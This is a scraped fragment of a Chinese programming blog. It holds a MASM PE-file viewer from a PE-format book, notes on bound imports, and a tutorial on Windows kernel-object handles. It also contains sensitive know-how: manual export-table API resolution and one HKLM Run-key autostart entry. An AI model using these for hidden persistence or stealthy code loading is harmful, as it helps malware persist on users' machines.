edx:nothing assume esi:nothing mov eax,offset szNotFound@@: mov @dwReturn,eax popad mov eax,@dwReturn ret_getRVASectionName endp;-------------------------------; 获取指定字符串的API函数的调用地址; 入口参数：_hModule为动态链接库的基址，_lpApi为API函数名的首址; 出口参数：eax为函数在虚拟地址空间中的真实地址;-------------------------------_getApi proc _hModule,_lpApi local @ret local @dwLen pushad mov @ret,0 ;计算API字符串的长度，含最后的零 mov edi,_lpApi mov ecx,-1 xor al,al cld repnz scasb mov ecx,edi sub ecx,_lpApi mov @dwLen,ecx ;从pe文件头的数据目录获取导出表地址 mov esi,_hModule add esi,[esi+3ch] assume esi:ptr IMAGE_NT_HEADERS mov esi,[esi].OptionalHeader.DataDirectory.VirtualAddress add esi,_hModule assume esi:ptr IMAGE_EXPORT_DIRECTORY ;查找符合名称的导出函数名 mov ebx,[esi].AddressOfNames add ebx,_hModule xor edx,edx .repeat push esi mov edi,[ebx] add edi,_hModule mov esi,_lpApi mov ecx,@dwLen repz cmpsb .if ZERO? pop esi jmp @F .endif pop esi add ebx,4 inc edx .until edx&gt;=[esi].NumberOfNames jmp _ret@@: ;通过API名称索引获取序号索引再获取地址索引 sub ebx,[esi].AddressOfNames sub ebx,_hModule shr ebx,1 add ebx,[esi].AddressOfNameOrdinals add ebx,_hModule movzx eax,word ptr [ebx] shl eax,2 add eax,[esi].AddressOfFunctions add eax,_hModule ;从地址表得到导出函数的地址 mov eax,[eax] add eax,_hModule mov @ret,eax_ret: assume esi:nothing popad mov eax,@ret ret_getApi endp;---------------------; 往文本框中追加文本;---------------------_appendInfo proc _lpsz local @stCR:CHARRANGE pushad invoke GetWindowTextLength,hWinEdit mov @stCR.cpMin,eax ;将插入点移动到最后 mov @stCR.cpMax,eax invoke SendMessage,hWinEdit,EM_EXSETSEL,0,addr @stCR invoke SendMessage,hWinEdit,EM_REPLACESEL,FALSE,_lpsz popad ret_appendInfo endp;--------------------; 从内存中获取PE文件的主要信息;--------------------_getMainInfo proc _lpFile,_lpPeHead,_dwSize local @szBuffer[1024]:byte local @szSecName[16]:byte pushad mov edi,_lpPeHead assume edi:ptr IMAGE_NT_HEADERS movzx ecx,[edi].FileHeader.Machine ;运行平台 movzx edx,[edi].FileHeader.NumberOfSections ;节的数量 movzx ebx,[edi].FileHeader.Characteristics ;节的属性 invoke wsprintf,addr @szBuffer,addr szMsg,\\ addr szFileName,ecx,edx,ebx,\\ [edi].OptionalHeader.ImageBase,\\ ;含建议装入的地址 [edi].OptionalHeader.AddressOfEntryPoint invoke SetWindowText,hWinEdit,addr @szBuffer;添加到编辑框中 ;显示每个节的主要信息 invoke _appendInfo,addr szMsgSec movzx ecx,[edi].FileHeader.NumberOfSections add edi,sizeof IMAGE_NT_HEADERS assume edi:ptr IMAGE_SECTION_HEADER .repeat push ecx ;获取节的名称，注意长度为8的名称并不以0结尾 invoke RtlZeroMemory,addr @szSecName,sizeof @szSecName push esi push edi mov ecx,8 mov esi,edi lea edi,@szSecName cld @@: lodsb .if !al ;如果名称为0，则显示为空格 mov al,' ' .endif stosb loop @B pop edi pop esi ;获取节的主要信息 invoke wsprintf,addr @szBuffer,addr szFmtSec,\\ addr @szSecName,[edi].Misc.VirtualSize,\\ [edi].VirtualAddress,[edi].SizeOfRawData,\\ [edi].PointerToRawData,[edi].Characteristics invoke _appendInfo,addr @szBuffer add edi,sizeof IMAGE_SECTION_HEADER pop ecx .untilcxz assume edi:nothing popad ret_getMainInfo endp;--------------------; 获取PE文件的导入表;--------------------_getImportInfo proc _lpFile,_lpPeHead,_dwSize local @szBuffer[1024]:byte local @szSectionName[16]:byte pushad mov edi,_lpPeHead assume edi:ptr IMAGE_NT_HEADERS mov eax,[edi].OptionalHeader.DataDirectory[8].VirtualAddress .if !eax invoke _appendInfo,addr szErrNoImport jmp _Ret .endif invoke _RVAToOffset,_lpFile,eax add eax,_lpFile mov edi,eax ;计算引入表所在文件偏移位置 assume edi:ptr IMAGE_IMPORT_DESCRIPTOR invoke _getRVASectionName,_lpFile,[edi].OriginalFirstThunk invoke wsprintf,addr @szBuffer,addr szMsg1,eax ;显示节名 invoke _appendInfo,addr @szBuffer .while [edi].OriginalFirstThunk || [edi].TimeDateStamp ||\\ [edi].ForwarderChain || [edi].Name1 ||\\ [edi].FirstThunk invoke _RVAToOffset,_lpFile,[edi].Name1 add eax,_lpFile invoke wsprintf,addr @szBuffer,addr szMsgImport,eax,\\ [edi].OriginalFirstThunk,[edi].TimeDateStamp,\\ [edi].ForwarderChain,[edi].FirstThunk invoke _appendInfo,addr @szBuffer ;获取IMAGE_THUNK_DATA列表到EBX .if [edi].OriginalFirstThunk mov eax,[edi].OriginalFirstThunk .else mov eax,[edi].FirstThunk .endif invoke _RVAToOffset,_lpFile,eax add eax,_lpFile mov ebx,eax .while dword ptr [ebx] ;按序号导入 .if dword ptr [ebx] &amp; IMAGE_ORDINAL_FLAG32 mov eax,dword ptr [ebx] and eax,0ffffh invoke wsprintf,addr @szBuffer,addr szMsg3,eax .else ;按名称导入 invoke _RVAToOffset,_lpFile,dword ptr [ebx] add eax,_lpFile assume eax:ptr IMAGE_IMPORT_BY_NAME movzx ecx,[eax].Hint invoke wsprintf,addr @szBuffer,\\ addr szMsg2,ecx,addr [eax].Name1 assume eax:nothing .endif invoke _appendInfo,addr @szBuffer add ebx,4 .endw add edi,sizeof IMAGE_IMPORT_DESCRIPTOR .endw_Ret: assume edi:nothing popad ret_getImportInfo endp;--------------------; 获取PE文件的导出表;--------------------_getExportInfo proc _lpFile,_lpPeHead,_dwSize local @szBuffer[1024]:byte local @szSectionName[16]:byte local @lpAddressOfNames,@dwIndex,@lpAddressOfNameOrdinals pushad mov esi,_lpPeHead assume esi:ptr IMAGE_NT_HEADERS mov eax,[esi].OptionalHeader.DataDirectory[0].VirtualAddress .if !eax invoke _appendInfo,addr szErrNoExport jmp _Ret .endif invoke _RVAToOffset,_lpFile,eax add eax,_lpFile mov edi,eax ;计算导出表所在文件偏移位置 assume edi:ptr IMAGE_EXPORT_DIRECTORY invoke _RVAToOffset,_lpFile,[edi].nName add eax,_lpFile mov ecx,eax invoke _getRVASectionName,_lpFile,[edi].nName invoke wsprintf,addr @szBuffer,addr szMsgExport,\\ eax,ecx,[edi].nBase,[edi].NumberOfFunctions,\\ [edi].NumberOfNames,[edi].AddressOfFunctions,\\ [edi].AddressOfNames,[edi].AddressOfNameOrdinals invoke _appendInfo,addr @szBuffer invoke _RVAToOffset,_lpFile,[edi].AddressOfNames add eax,_lpFile mov @lpAddressOfNames,eax invoke _RVAToOffset,_lpFile,[edi].AddressOfNameOrdinals add eax,_lpFile mov @lpAddressOfNameOrdinals,eax invoke _RVAToOffset,_lpFile,[edi].AddressOfFunctions add eax,_lpFile mov esi,eax ;函数的地址表 mov ecx,[edi].NumberOfFunctions mov @dwIndex,0@@: pushad mov eax,@dwIndex push edi mov ecx,[edi].NumberOfNames cld mov edi,@lpAddressOfNameOrdinals repnz scasw .if ZERO? ;找到函数名称 sub edi,@lpAddressOfNameOrdinals sub edi,2 shl edi,1 add edi,@lpAddressOfNames invoke _RVAToOffset,_lpFile,dword ptr [edi] add eax,_lpFile .else mov eax,offset szExportByOrd .endif pop edi ;序号在ecx中 mov ecx,@dwIndex add ecx,[edi].nBase invoke wsprintf,addr @szBuffer,addr szMsg4,\\ ecx,dword ptr [esi],eax invoke _appendInfo,addr @szBuffer popad add esi,4 inc @dwIndex loop @B_Ret: assume esi:nothing assume edi:nothing popad ret_getExportInfo endp;--------------------; 获取PE文件的重定位信息;--------------------_getRelocInfo proc _lpFile,_lpPeHead,_dwSize local @szBuffer[1024]:byte local @szSectionName[16]:byte pushad mov esi,_lpPeHead assume esi:ptr IMAGE_NT_HEADERS mov eax,[esi].OptionalHeader.DataDirectory[8*5].VirtualAddress .if !eax invoke _appendInfo,addr szMsgReloc4 jmp _ret .endif push eax invoke _RVAToOffset,_lpFile,eax add eax,_lpFile mov esi,eax pop eax invoke _getRVASectionName,_lpFile,eax invoke wsprintf,addr @szBuffer,addr szMsgReloc1,eax invoke _appendInfo,addr @szBuffer assume esi:ptr IMAGE_BASE_RELOCATION ;循环处理每个重定位块 .while [esi].VirtualAddress cld lodsd ;eax=[esi].VirtualAddress mov ebx,eax lodsd ;eax=[esi].SizeofBlock sub eax,sizeof IMAGE_BASE_RELOCATION ;块总长度-两个dd shr eax,1 ;然后除以2，得到重定位项数量 ;除以2是因为重定位项是word push eax invoke wsprintf,addr @szBuffer,addr szMsgReloc2,ebx,eax invoke _appendInfo,addr @szBuffer pop ecx ;重定位项数量 xor edi,edi .repeat push ecx lodsw mov cx,ax and cx,0f000h ;得到高四位 .if cx==03000h ;重定位地址指向的双字的32位都需要休正 and ax,0fffh movzx eax,ax add eax,ebx ;得到修正以前的偏移， ;该偏移加上装入时的基址就是绝对地址 .else ;该重定位项无意义，仅用来作为对齐 mov eax,-1 .endif invoke wsprintf,addr @szBuffer,addr szMsgReloc3,eax inc edi .if edi==8 ;每显示8个项目换行 invoke lstrcat,addr @szBuffer,addr szCrLf xor edi,edi .endif invoke _appendInfo,addr @szBuffer pop ecx .untilcxz .if edi invoke _appendInfo,addr szCrLf .endif .endw_ret: assume esi:nothing popad ret_getRelocInfo endp;--------------------; 打开PE文件并处理;--------------------_openFile proc local @stOF:OPENFILENAME local @hFile,@dwFileSize,@hMapFile,@lpMemory invoke RtlZeroMemory,addr @stOF,sizeof @stOF mov @stOF.lStructSize,sizeof @stOF push hWinMain pop @stOF.hwndOwner mov @stOF.lpstrFilter,offset szExtPe mov @stOF.lpstrFile,offset szFileName mov @stOF.nMaxFile,MAX_PATH mov @stOF.Flags,OFN_PATHMUSTEXIST or OFN_FILEMUSTEXIST invoke GetOpenFileName,addr @stOF ;让用户选择打开的文件 .if !eax jmp @F .endif invoke CreateFile,addr szFileName,GENERIC_READ,\\ FILE_SHARE_READ or FILE_SHARE_WRITE,NULL,\\ OPEN_EXISTING,FILE_ATTRIBUTE_ARCHIVE,NULL .if eax!=INVALID_HANDLE_VALUE mov @hFile,eax invoke GetFileSize,eax,NULL mov @dwFileSize,eax .if eax invoke CreateFileMapping,@hFile,\\ ;内存映射文件 NULL,PAGE_READONLY,0,0,NULL .if eax mov @hMapFile,eax invoke MapViewOfFile,eax,\\ FILE_MAP_READ,0,0,0 .if eax ;获得文件在内存的映象起始位置 mov @lpMemory,eax assume fs:nothing push ebp push offset _ErrFormat push offset _Handler push fs:[0] mov fs:[0],esp ;检测PE文件是否有效 mov esi,@lpMemory assume esi:ptr IMAGE_DOS_HEADER ;判断是否有MZ字样 .if [esi].e_magic!=IMAGE_DOS_SIGNATURE jmp _ErrFormat .endif ;调整ESI指针指向PE文件头 add esi,[esi].e_lfanew assume esi:ptr IMAGE_NT_HEADERS ;判断是否有PE字样 .if [esi].Signature!=IMAGE_NT_SIGNATURE jmp _ErrFormat .endif ;到此为止，该文件的验证已经完成。为PE结构文件 ;接下来分析分件映射到内存中的数据，并显示主要参数 invoke _getMainInfo,@lpMemory,esi,@dwFileSize ;显示导入表 invoke _getImportInfo,@lpMemory,esi,@dwFileSize ;显示导出表 invoke _getExportInfo,@lpMemory,esi,@dwFileSize ;显示重定位信息 invoke _getRelocInfo,@lpMemory,esi,@dwFileSize jmp _ErrorExit _ErrFormat: invoke MessageBox,hWinMain,offset szErrFormat,\\ NULL,MB_OK_ErrorExit: pop fs:[0] add esp,0ch invoke UnmapViewOfFile,@lpMemory .endif invoke CloseHandle,@hMapFile .endif invoke CloseHandle,@hFile .endif .endif@@: ret_openFile endp;-------------------; 窗口程序;-------------------_ProcDlgMain proc uses ebx edi esi hWnd,wMsg,wParam,lParam mov eax,wMsg .if eax==WM_CLOSE invoke EndDialog,hWnd,NULL .elseif eax==WM_INITDIALOG ;初始化 push hWnd pop hWinMain call _init .elseif eax==WM_COMMAND ;菜单 mov eax,wParam .if eax==IDM_EXIT ;退出 invoke EndDialog,hWnd,NULL .elseif eax==IDM_OPEN ;打开文件 call _openFile .elseif eax==IDM_1 ;以下三个菜单是7岁的儿子完成的！！ invoke MessageBox,NULL,offset szErrFormat,offset szErr,MB_ICONWARNING .elseif eax==IDM_2 invoke MessageBox,NULL,offset szErrFormat,offset szErr,MB_ICONQUESTION .elseif eax==IDM_3 invoke MessageBox,NULL,offset szErrFormat,offset szErr,MB_YESNOCANCEL .endif .else mov eax,FALSE ret .endif mov eax,TRUE ret_ProcDlgMain endpstart: invoke LoadLibrary,offset szDllEdit mov hRichEdit,eax invoke GetModuleHandle,NULL mov hInstance,eax invoke DialogBoxParam,hInstance,\\ DLG_MAIN,NULL,offset _ProcDlgMain,NULL invoke FreeLibrary,hRichEdit invoke ExitProcess,NULL end start 运行测试 绑定导入绑定导入机制双桥结构的导入表中，桥2是指向IAT的，WIndows加载程序负责IAT中地址的修正工作。 不同的系统中，动态链接库的基地址是不一样的 绑定导入数据定位本节中的例子须使用32位系统下的Notepad.exe，打开Win10下的看到的结果是不同的。 从以上字节码可以看出： 绑定导入数据RVA = 0x0000250 绑定导入数据大小000000D0 根据RVA和FOA的换算关系，得出文件的偏移为：0x00000250 绑定导入数据结构12345IMAGE_BOUND_IMPORT_DESCRIPTOR struct TimeDataStamp dword ? ;0000h 时间戳 OffsetMoudleName word ?;0004h 指向dll的名称 NumberOfMoudleForwarderRefs word ? ;0006h MoudleForwarderRefs 数目IMAGE_BOUND_IMPORT_DESCRIPTOR ends TimeDataStamp双字，该字段值必须要与引用的DLL的文件头IMAGE_FILE_HANDER.TimeDataStamp字段值相吻合，否则就会促使加载器去重新计算IAT OffsetMoudleName单字，该字段包含了以第一个IMAGE_BOUND_IMPORT_DESCRIPTOR作为基址，DLL名称字符串的偏移 NumberOfMoudleForwarderRefs单字，该字段描述了紧接在IMAGE_BOUND_IMPORT_DESCRIPTOR结构后的另一个结构IMAGE_BOUND_FORWARDER_REF数组的元素个数 123456IMAGE_BOUND_FORWARDER_REF struct{ TimeDataStamp dword ? ;0000h 时间戳 OffsetMoudleName word ?;0004h 指向dll的名称 Reserved word ? ;预留}IMAGE_BOUND_FORWARDER_REF ENDS 绑定导入分析实例手工重组导入表{HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run&quot;NewValue=C:\\PE\\4\\.LockTray.exe”} 常用注册表API","link":"/2019/09/05/PE%E6%9D%83%E5%A8%81%E6%8C%87%E5%8D%97-PE%E5%AF%BC%E5%85%A5%E8%A1%A8/"},{"title":"Windows-Kernel-3","text":"内核对象 什么是内核对象每个内核对象只是内核分配的一个内存块，并且只能由该内核访问。该内存块是一种数据结构，它的成员负责维护对象的各种信息。 内核对象的使用计数内核对象由内核拥有，而不是进程拥有。 假如你的进程调用了一个创建内核对象的函数，然后你的进程终止运行，那么内核对象不一定会被撤销，在大多数情况下，对象被撤销，但是如果另一个进程正在使用你的进程创建内核对象，那么内核知道，在另一个进程停止使用该对象之前不要撤销该对象，必须记住：内核对象的存在时间可以比创建该对象的进程长 内核知道有多少进程正在使用某个内核对象，因为每个对象包含一个使用计数。使用计数是所有内核对象类型常用的数据类型之一。 当一个对象被创建的时候，它的计数被置为1，当另外一个进程访问内核对象的时候，使用计数就递增1，当进程终止的时候，内核对象就自动确定该进程打开的所有内核对象的使用计数。当内核对象的使用计数为0，内核就撤销该对象 使用Winobj查看内核对象 安全性内核对象能够得到安全描述符的保护。安全描述符用于描述谁创建了对象，谁能够访问或操作该对象。 用于创建内核对象的函数几乎都有一个指向SECURITY_ATTRIBUTES结构的指针作为其参数； 12345678HANDLE CreateFileMapping{ HANDLE hFile, PSECURITY_ATTRIBUTES, DWORD flProtect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, PCTSTR pszName}; 大多数应用程序只是为该函数传递NULL，这样就可以创建带有默认安全性的内核对象； 默认安全性意味着对象的管理小组的任何成员和对象的创建者都拥有对该对象的全部访问权，而其他所有人均无权访问该对象。 进程的内核对象句柄表当一个进程被初始化时，系统要为它分配一个句柄表。该句柄表只用于内核对象不用于用户对象或者GDI对象 进程句柄表是一个由数据结构组成的数组。每个结构包含一个指向内核对象的指针，一个访问掩码和一些标志。 创建内核对象当进程初次初始化时，它的句柄表是空的，当进程中的线程调用创建内核对象的函数的时候，内核就为该对象分配一个内存块，并对它初始化。这时候，内核对进程的句柄表进行扫描，找出一个空项。 123456789101112131415161718192021222324252627282930HANDLE CreateThread( PSECURITY_ATTRIBUTE psa, DWORD dwStackSize, LPTHREAD_START_ROUTINE pfnStartAddr, PVOID pvParam, DWORD dwCreationFlags, PDWORD pdwThreadId);HANDLE CreateFile( PCTSTR pszFileNAme, DWORD dwDesiredAccess, DWORD dwShareMode, PSECURITY_ATTRIBUTES psa, DWORD dwCreationDistribution, DWORD dwFlagsAndAttributes, HANDLE hTemplateFile);HANDLE CreateFileMapping( HANDLE hFile, PSECURITY_ATTRIBUTES psa, DWORD flPRotect, DWORD dwMaximumSizeHigh, DWORD dwMaximumSizeLow, PCTSTR pszName);HANDLE CreateSemaphore( PSECURITY_ATTRIBUTES psa, LONG lInitialCount, LONG lMaximumCount, PCTSTR pszName); 用于创建内核对象的所有函数均返回与进程相关的句柄，这些句柄可以被在相同的进程中运行的任何或所有线程成功的加以使用。该句柄值实际上是放入进程的句柄表中的索引，它用于标识内核对象的信息存放的位置。 每当调用一个将内核对象句柄接受为参数的函数时，就要传递由一个 C r e a t e * &amp;函数返回的值。从内部来说，该函数要查看进程的句柄表，以获取要生成的内核对象的地址，然后按定义得很好的方式来生成该对象的数据结构。 如果调用一个函数以便创建内核对象，但是调用失败了，那么返回的句柄值通常是0（NULL）。发生这种情况是因为系统的内存非常短缺，或者遇到了安全方面的问题。不过有少数函数在运行失败时返回的句柄值是-1（INVALID_HANDLE_VALUE）。例如，如果CreateFile未能打开指定的文件，那么它将返回INVALID_HANDLE_VALUE，而不是返回NULL。当查看创建内核对象的函数返回值时，必须格外小心。特别要注意的是，只有当调用CreateFile函数时，才能将该值与INVALID_HANDLE_VALUE进行比较。下面的代码是不正确的： 1234HANDLE hMutex = CreateMutex(...);if (hMutex == INVALID_HANDLE_VALUE) { //这段代码不会执行，因为CreateMutex调用失败的时候返回的是NULL} 同样的，下面的代码也不正确： 1234HANDLE hFile = CreateFile(...);if (hFIle == NULL) { //这段代码不会执行，因为CreateFile调用失败的时候返回的是INVALID_HANDLE_VALUE(-1)} 关闭内核对象无论怎样创建内核对象，都要向系统指明将通过调用C l o s e H a n d l e来结束对该对象的操作： 1BOOL CloseHandle(HANDLE hobj); 如果该句柄是有效的，那么系统就可以获得内核对象的数据结构的地址，并可确定该结构中的使用计数的数据成员。如果使用计数是0，该内核便从内存中撤消该内核对象。 如果将一个无效句柄传递给CloseHandle，将会出现两种情况之一。如果进程运行正常，CloseHandle返回FALSE，而GetLastError则返回ERROR_INVALID_HANDLE。如果进程正在排除错误，系统将通知调试程序，以便能排除它的错误。 在CloseHandle返回之前，它会清除进程的句柄表中的项目，该句柄现在对你的进程已经无效，不应该试图使用它。无论内核对象是否已经撤消，都会发生清除操作。当调用CloseHandle函数之后，将不再拥有对内核对象的访问权，不过，如果该对象的使用计数没有递减为0，那么该对象尚未被撤消。这没有问题，它只是意味着一个或多个其他进程正在使用该对象。当其他进程停止使用该对象时（通过调用CloseHandle），该对象将被撤消。 假如忘记调用CloseHandle函数，那么会不会出现内存泄漏呢？答案是可能的，但是也不一定。在进程运行时，进程有可能泄漏资源（如内核对象）。但是，当进程终止运行时，操作系统能够确保该进程使用的任何资源或全部资源均被释放，这是有保证的。对于内核对象来说，系统将执行下列操作：当进程终止运行时，系统会自动扫描进程的句柄表。如果该表拥有任何无效项目（即在终止进程运行前没有关闭的对象），系统将关闭这些对象句柄。如果这些对象中的任何对象的使用计数降为0，那么内核便撤消该对象。 因此，应用程序在运行时有可能泄漏内核对象，但是当进程终止运行时，系统将能确保所有内容均被正确地清除。另外，这个情况适用于所有对象、资源和内存块，也就是说，当进程终止运行时，系统将保证进程不会留下任何对象。 跨越进程边界共享内核对象需要跨进程共享的内核对象 a.利用文件映像对象，可以在同一台机器上运行的两个进程之间共享数据块。 b. 借助邮件槽和命名管道，在网络中的不同计算机上运行的进程可以相互发送数据块。 c. 互斥量，信号量和事件允许不同进程的线程同步执行。例如一个应用程序可能需要完成某一个任务以后向另一个应用程序发出通知。 为了操作系统的安全，OS将内核对象设计成进程相关。 windows中有3中机制允许进程共享内核对象：使用对象句柄继承；为对象命名；复制对象句柄。 使用对象句柄继承只有在进程之间有一个父-子关系的时候，才可以使用对象句柄继承。 父进程有一个或多个内核对象句柄可以使用，而且父进程创建一个子进程，并允许子进程访问父进程的内核对象。 步骤 父进程创建句柄的时候必须向系统指出该对象是可以继承的。（这里指的是对象句柄的继承） 父进程需要初始化SECURITY_ATTRIBUTES结构 再将其传递给Create函数。 以下代码创建了一个可继承的互斥量对象。 1234567SECURITY_ATTRIBUTES sa;sa.nLength = sizeof(sa);sa.lpSecurityDescriptor = NULL;sa.bInheritHandle = TRUE; // Make the returned handle inheritable. HANDLE hMutex = CreateMutex(&amp;sa, FALSE, NULL); 句柄表中每个记录项都有一个指明句柄是否可以继承的标志位。如果在创建句柄时传入的 SECURITY_ATTRIBUTES 结构参数为NULL返回的句柄是不可继承的，这个标志位为0. 将bInheritHandle成员设置为TRUE，将导致这个标志位被设为1. 以上句柄表中，索引号为3的内核对象可以被继承。索引号为1的内核对象不可继承，索引号为2的内核对象不可用。 为了使对象句柄继承，接下来是生成子进程。通过CreateProcess函数完成 12345678910111213141516WINBASEAPIBOOLWINAPICreateProcessW( _In_opt_ LPCWSTR lpApplicationName, _Inout_opt_ LPWSTR lpCommandLine, _In_opt_ LPSECURITY_ATTRIBUTES lpProcessAttributes, _In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes, _In_ BOOL bInheritHandles, _In_ DWORD dwCreationFlags, _In_opt_ LPVOID lpEnvironment, _In_opt_ LPCWSTR lpCurrentDirectory, _In_ LPSTARTUPINFOW lpStartupInfo, _Out_ LPPROCESS_INFORMATION lpProcessInformation ); bInheritHandles参数，通常情况传递FALSE（不希望子进程继承父进程句柄表中的“可继承句柄”）如果传递TRUE，子进程就会继承父进程的“可继承的句柄值”。创建进程以后系统先建一张空的句柄表，然后遍历其父进程句柄表并复制所有可继承属性的内核对象。 并且复制项的位置和他在父进程表中的位置是完全一样的。主进程中的Handle值在子进程中仍然可用。 同时会增加被复制的内核对象的引用计数器。 表3是一个子进程的句柄表 1,2 项未初始化不可用 第三项是从父进程复制过来的内核对象，地址完全相同索引号也一致，并且标志是可继承。 内核对象的内容被保存在内核地址空间中–系统上所有运行的进程共享这个空间。（内核模式分区） 在32位系统下 是 0x8000 0000 到 0xFFFF FFFF之间。 对于64位系统，则是 0x0000 0400 0000 0000 到 0xFFFF FFFF FFFF FFFF之间。 子进程同样调用CreateProcess创建自己的孙进程，并将bInheritHandles参数设置为TRUE，孙进程也会继承该内核对象。并且3个进程的内核对象在句柄表中的内容和索引号一致。以此类推 对象继承只发生在创建进程的同时，如果子进程创建以后父进程又创建了新的内核对象则该对象并不被继承。 另外子进程本身并不会被通知从父进程那里继承了哪些内核对象（需要自行写代码通知） 通常用命令行参数传递。子进程的初始化代码将解析命令行并提取值。（因为内核对象具有相同的索引值和指针值）可以直接使用父句柄传递的句柄值 也可以等子进程创建完毕主线程发送一个消息给子进程中的一个线程处理（WaitForInputIdle） 另一种方式是在主进程所在的环境块添加环境变量设置继承句柄值，子进程会继承父进程的环境变量。通过调用GetEnvironmentVariable来获取继承到的内核对象的句柄值。 参考子进程继承父控制台的特例 改变句柄的标志SetHandleInformation可以改变内核对象句柄的继承标志。 12345678WINBASEAPIBOOLWINAPISetHandleInformation( _In_ HANDLE hObject, _In_ DWORD dwMask, _In_ DWORD dwFlags ); hObject一个有效的句柄 dwMask更改那些标志 123#define HANDLE_FLAG_INHERIT 0x00000001#define HANDLE_FLAG_PROTECT_FROM_CLOSE 0x00000002 dwFlags要设置的值。 例如 1234567// open the inherit flagSetHandleInformation(hObj, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT); // clos the inherit flagSetHandleInformation(hObj, HANDLE_FLAG_INHERIT, 0); HANDLE_FLAG_PROTECT_FROM_CLOSE 告知系统不允许关闭句柄 以下例子会触发一个异常（在调试器下）在运行模式下CloseHandle返回FALSE 123SetHandleInformation(hObj, HANDLE_FLAG_PROTECT_FROM_CLOSE,HANDLE_FLAG_PROTECT_FROM_CLOSE);CloseHandle(hObj); 关闭保护 12SetHandleInformation(hObj, HANDLE_FLAG_PROTECT_FROM_CLOSE, 0); 获取内核对象的标志信息 12345678WINBASEAPIBOOLWINAPIGetHandleInformation( _In_ HANDLE hObject, _Out_ LPDWORD lpdwFlags ); 获取一个内核对象是否允许被继承的例子 1234DWORD dwFlags;GetHandleInformation(hObj, &amp;dwFlags);BOOL fHandleIsInheritable = (0 != (dwFlags &amp; HANDLE_FLAG_INHERIT)); 为对象命名垮进程共享内核对象的第二个方法是为对象命名。许多内核对象都可以命名。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465WINBASEAPI_Ret_maybenull_HANDLEWINAPICreateMutexW( _In_opt_ LPSECURITY_ATTRIBUTES lpMutexAttributes, _In_ BOOL bInitialOwner, _In_opt_ LPCWSTR lpName ); WINBASEAPI_Ret_maybenull_HANDLEWINAPICreateEventW( _In_opt_ LPSECURITY_ATTRIBUTES lpEventAttributes, _In_ BOOL bManualReset, _In_ BOOL bInitialState, _In_opt_ LPCWSTR lpName ); WINBASEAPI_Ret_maybenull_HANDLEWINAPICreateSemaphoreW( _In_opt_ LPSECURITY_ATTRIBUTES lpSemaphoreAttributes, _In_ LONG lInitialCount, _In_ LONG lMaximumCount, _In_opt_ LPCWSTR lpName ); WINBASEAPI_Ret_maybenull_HANDLEWINAPICreateWaitableTimerW( _In_opt_ LPSECURITY_ATTRIBUTES lpTimerAttributes, _In_ BOOL bManualReset, _In_opt_ LPCWSTR lpTimerName ); WINBASEAPI_Ret_maybenull_HANDLEWINAPICreateFileMappingW( _In_ HANDLE hFile, _In_opt_ LPSECURITY_ATTRIBUTES lpFileMappingAttributes, _In_ DWORD flProtect, _In_ DWORD dwMaximumSizeHigh, _In_ DWORD dwMaximumSizeLow, _In_opt_ LPCWSTR lpName ); WINBASEAPI_Ret_maybenull_HANDLEWINAPICreateJobObjectW( _In_opt_ LPSECURITY_ATTRIBUTES lpJobAttributes, _In_opt_ LPCWSTR lpName ); 所有这些Create函数有一个Name参数，传入NULL表示匿名内核对象。可以使用继承技术 或者使用DuplicateHandle来实现进程间的对象共享。 所有的命名内核对象共享一个命名空间。以下例子CreateSemaphore函数会返回NULL 通过命名对象共享的一个例子 在进程A中创建了一个名字为“JeffMutex”的互斥量对象 HANDLE hMutexProcessA = CreateMutex(NULL, FALSE, TEXT(“JeffMutex”)); 然后通过某进程生成了进程B（B不是A的子进程）在B进程中调用 HANDLE hMutexProcessB = CreateMutex(NULL, FALSE, TEXT(“JeffMutex”)); 系统找到内核表中的JeffMutex判断类型，进行安全检查。都通过就会将记录赋值到进程B中的句柄表内，并且引用计数器+1 否则返回NULL （可以采用CreateMutexEx设置信号量的访问权限。） 通过名称来实现内核对象共享时，进程B调用CreateMutex时，会向安全函数传递安全信息。如果已经存在一个指定名称的对象，这些参数就会被忽略。函数并不知道自己是创建了一个新的内核对象还是打开一个已有的。 可以调用GetLastError判断刚才是创建了一个还是打开了一个现有的。 12345678910111213141516171819202122232425262728#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main(int argc, char* argv[]){ SECURITY_ATTRIBUTES sa; sa.nLength = sizeof(sa); sa.lpSecurityDescriptor = NULL; sa.bInheritHandle = TRUE; HANDLE hMutex = CreateMutex(&amp;sa, FALSE, TEXT(&quot;JeffMutex&quot;)); if (GetLastError() == ERROR_ALREADY_EXISTS) { //Opened a handle to an existing object. //sa.lpSecurityDescriptor and the second parameter // are ignored. printf(&quot;Opened a handle to an existing object.\\n&quot;); } else { //Created a brand new object. //sa.lpSecurityDescriptor and the second parameter //FALSE are used to construct the object. printf(&quot;Created a brand new object.\\n&quot;); } system(&quot;pause&quot;); return 0;} 为了实现具名内核对象的共享，还可以使用一系列Open*函数 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960WINBASEAPI_Ret_maybenull_HANDLEWINAPIOpenMutexW( _In_ DWORD dwDesiredAccess, _In_ BOOL bInheritHandle, _In_ LPCWSTR lpName ); WINBASEAPI_Ret_maybenull_HANDLEWINAPIOpenEventW( _In_ DWORD dwDesiredAccess, _In_ BOOL bInheritHandle, _In_ LPCWSTR lpName ); WINBASEAPI_Ret_maybenull_HANDLEWINAPIOpenSemaphoreW( _In_ DWORD dwDesiredAccess, _In_ BOOL bInheritHandle, _In_ LPCWSTR lpName ); WINBASEAPI_Ret_maybenull_HANDLEWINAPIOpenWaitableTimerW( _In_ DWORD dwDesiredAccess, _In_ BOOL bInheritHandle, _In_ LPCWSTR lpTimerName ); WINBASEAPI_Ret_maybenull_HANDLEWINAPIOpenFileMappingW( _In_ DWORD dwDesiredAccess, _In_ BOOL bInheritHandle, _In_ LPCWSTR lpName ); WINBASEAPI_Ret_maybenull_HANDLEWINAPIOpenJobObjectW( _In_ DWORD dwDesiredAccess, _In_ BOOL bInheritHandle, _In_ LPCWSTR lpName ); 以上函数原型一致，最后一个参数指向内核对象的名称。并且该参数不能为NULL如果在系统内核表中无法搜索到同名的内核对象则返回NULL GetLastError返回2 （ERROR_FILE_NOT_FOUND） 如果找到同名的内核对象但类型不同，返回NULL GetLastError返回6（ERROR_INVALID_HANDLE） 